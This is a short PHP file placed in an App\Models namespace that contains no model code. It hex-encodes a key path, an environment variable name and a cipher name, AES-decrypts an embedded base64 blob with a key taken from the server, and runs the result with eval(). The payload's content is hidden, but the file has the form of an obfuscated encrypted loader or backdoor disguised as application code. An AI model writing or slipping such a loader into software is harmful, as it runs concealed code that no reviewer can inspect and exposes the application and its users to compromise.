<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('O8g5BSqxxGcKXQnXscDEBA==');

$c=base64_decode(

'4Dl+8NVCxb/5Dt/MftsazRTZN+3WlOd+eDeENeUj1Q6BKq4sQBTVgnQHJeQ5k5C82w3YeqoPkRYL' .
'TBrGtYcNTKp18Fe3Ii1VUwO9YY99vuwt+SsB1QTwMwb/qVfw9zuglF2JqylEUVhHfaOAt3WhefLx' .
'yoWrBW8H0okmJ5hNaNbH76V0m/ifN2sdoa6Mn35758ubJJ3N5A3YAlBlZyvasJ1Hk2BbOpYw/Q7u' .
'emEZAmeLSfQPyBOQALlmAoFdiIlRv7KCsiX1m81eZvWN2r+l7sedkYko8PuLA9b1SLgkegkXWhcm' .
'V6XtNFXAsrdtKdke8pqGHEOzHS7LjIHB3tIATWnEG6jZvcjDNVWigpcU28DhCF5D5Ulg/Wdlq52o' .
'6xkYr68JezgMA0th8rhqJyitU86VnoyUTnZwdZcTRdYKvUA64+k6RPtN24cgTUnzV3aXtB39arQv' .
'EOnzOIJ4MVqd9bLrjkeGBOfskcXVNGkC5gJw+QdIVxO0ZcVnMQMAFKOO8HmnE0Xx1SnXpd58Oklp' .
'6oLVV7zugHd+pcghKfmTjhGKC4K97JvU1TQoFJXcnDV3bw2LvIs/JA7qTjwPKkmD6J1eclsoog3Q' .
'CMvP4yv+fW+M0WLDBnQtTyDBRnZJaGl8Vy3xqRU8N6pIiZu98YpMhp6ooILZQ9WefMW1wrphD4/w' .
'i0YgfqIWxI/ftDsDeKTGUTShM0l1F0UafLI1URLb5FkHawNcb5QcWkJ9jPq/hRW1LsQagaeZmhNN' .
'PkXQz/qno+cGJeJjJtwpnCxJIWEFX5D5NdMEkPO0O/WK/2utaAfrQJIAZzQEJTHqC7E8REMHMDex' .
'9XXmqJ6gNIZ5P1/Nfrv6MqQ0Jd4EEoV1Nn/VN52lzINIDc0Yxyz5LlXZDsRgET6Yt3nWYRWH/Zc/' .
'fgXhoA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

